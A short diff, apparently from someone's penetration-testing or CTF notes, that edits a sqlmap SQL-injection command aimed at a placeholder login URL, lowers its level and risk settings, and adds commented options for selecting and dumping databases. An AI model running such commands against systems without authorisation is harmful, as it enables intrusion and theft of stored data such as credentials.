@@ -1,1 +1,6 @@
-sqlmap -u $URL --data='user=user&password=password&s=ok' --level=5 --risk=3
+sqlmap -u $URL --data='user=user&password=password&s=ok' --level=1 --risk=1
+
+# Options
+# -D db_to_select
+# --dump
+# --dump-all
